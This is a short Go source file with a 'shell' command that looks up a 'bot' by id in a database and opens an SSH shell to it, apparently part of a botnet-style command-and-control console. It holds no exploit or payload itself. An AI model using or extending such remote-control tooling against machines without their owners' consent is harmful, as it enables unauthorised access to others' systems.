package cmd

import (
	"fmt"
	"strconv"

	"../database"
	"../ssh"
)

var (
	shellDesc = []string{"interact with a client via shell control",
		"Usage: shell {id}"}
	ErrIDInvalid  = fmt.Errorf("invalid id")
	ErrGettingBot = fmt.Errorf("couldn't get bot from database")
)

func cmdShell(args []string) error {
	if len(args) == 0 {
		return ErrNoArgs
	}

	id, err := strconv.ParseUint(args[0], 10, 64)
	if err != nil {
		return ErrIDInvalid
	}

	bot, err := database.GetBot(id)
	if err != nil {
		return ErrGettingBot
	}

	err = ssh.CreateShell(&bot)
	if err != nil {
		return ErrNoConn
	}
	return nil
}
